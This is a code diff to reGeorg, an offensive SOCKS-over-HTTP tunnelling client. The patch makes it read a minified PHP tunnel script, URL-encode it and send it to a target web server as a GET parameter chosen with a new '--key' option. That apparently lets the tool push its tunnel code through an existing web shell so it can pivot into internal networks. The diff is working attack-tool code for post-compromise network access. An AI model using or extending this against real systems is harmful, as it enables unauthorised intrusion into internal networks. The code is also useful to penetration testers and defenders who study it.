@@ -3,7 +3,9 @@
 
 import logging
 import argparse
+import urllib
 import urllib3
+from io import open
 from threading import Thread
 from urlparse import urlparse
 from socket import *
@@ -56,6 +58,7 @@ COLORS = {
     'WHITE': WHITE,
 }
 
+php_code = urllib.quote(str(open('tunnel.minified.php', 'rb').read().decode('utf-8')))
 
 def formatter_message(message, use_color=True):
     if use_color:
@@ -127,7 +130,7 @@ class session(Thread):
                 self.httpPort = 80
         self.httpScheme = o.scheme
         self.httpHost = o.netloc.split(":")[0]
-        self.httpPath = o.path
+        self.httpPath = connectString
         self.cookie = None
         if o.scheme == "http":
             self.httpScheme = urllib3.HTTPConnectionPool
@@ -224,7 +227,7 @@ class session(Thread):
         cookie = None
         conn = self.httpScheme(host=self.httpHost, port=self.httpPort)
         # response = conn.request("POST", self.httpPath, params, headers)
-        response = conn.urlopen('POST', self.connectString + "?cmd=connect&target=%s&port=%d" % (target, port), headers=headers, body="")
+        response = conn.urlopen('POST', self.connectString + "&cmd=connect&target=%s&port=%d" % (target, port), headers=headers, body="")
         if response.status == 200:
             status = response.getheader("x-status")
             if status == "OK":
@@ -243,7 +246,7 @@ class session(Thread):
         headers = {"X-CMD": "DISCONNECT", "Cookie": self.cookie}
         params = ""
         conn = self.httpScheme(host=self.httpHost, port=self.httpPort)
-        response = conn.request("POST", self.httpPath + "?cmd=disconnect", params, headers)
+        response = conn.request("POST", self.httpPath + "&cmd=disconnect", params, headers)
         if response.status == 200:
             log.info("[%s:%d] Connection Terminated" % (self.target, self.port))
         conn.close()
@@ -256,7 +259,7 @@ class session(Thread):
                     break
                 data = ""
                 headers = {"X-CMD": "READ", "Cookie": self.cookie, "Connection": "Keep-Alive"}
-                response = conn.urlopen('POST', self.connectString + "?cmd=read", headers=headers, body="")
+                response = conn.urlopen('POST', self.connectString + "&cmd=read", headers=headers, body="")
                 data = None
                 if response.status == 200:
                     status = response.getheader("x-status")
@@ -304,7 +307,7 @@ class session(Thread):
                 if not data:
                     break
                 headers = {"X-CMD": "FORWARD", "Cookie": self.cookie, "Content-Type": "application/octet-stream", "Connection": "Keep-Alive"}
-                response = conn.urlopen('POST', self.connectString + "?cmd=forward", headers=headers, body=data)
+                response = conn.urlopen('POST', self.connectString + "&cmd=forward", headers=headers, body=data)
                 if response.status == 200:
                     status = response.getheader("x-status")
                     if status == "OK":
@@ -371,7 +374,7 @@ def askGeorg(connectString):
         httpScheme = urllib3.HTTPSConnectionPool
 
     conn = httpScheme(host=httpHost, port=httpPort)
-    response = conn.request("GET", httpPath)
+    response = conn.request("GET", connectString)
     if response.status == 200:
         if BASICCHECKSTRING == response.data.strip():
             log.info(BASICCHECKSTRING)
@@ -393,6 +396,7 @@ if __name__ == '__main__':
   willem@sensepost.com / @_w_m__
   sam@sensepost.com / @trowalts
   etienne@sensepost.com / @kamp_staaldraad
+  github@zsxsoft.com / @zsxsoft
   \033[0m
    """
     log.setLevel(logging.DEBUG)
@@ -401,13 +405,16 @@ if __name__ == '__main__':
     parser.add_argument("-p", "--listen-port", metavar="", help="The default listening port", type=int, default="8888")
     parser.add_argument("-r", "--read-buff", metavar="", help="Local read buffer, max data to be sent per POST", type=int, default="1024")
     parser.add_argument("-u", "--url", metavar="", required=True, help="The url containing the tunnel script")
+    parser.add_argument("-k", "--key", metavar="", required=True, help="The GET paramter")
     parser.add_argument("-v", "--verbose", metavar="", help="Verbose output[INFO|DEBUG]", default="INFO")
     args = parser.parse_args()
+    args.url = args.url + "?" + args.key + "=" + php_code
+
     if (args.verbose in LEVEL):
         log.setLevel(LEVEL[args.verbose])
         log.info("Log Level set to [%s]" % args.verbose)
+        log.info("Starting socks server [%s:%d], tunnel at [%s]" % (args.listen_on, args.listen_port, args.url))
 
-    log.info("Starting socks server [%s:%d], tunnel at [%s]" % (args.listen_on, args.listen_port, args.url))
     log.info("Checking if Georg is ready")
     if not askGeorg(args.url):
         log.info("Georg is not ready, please check url")
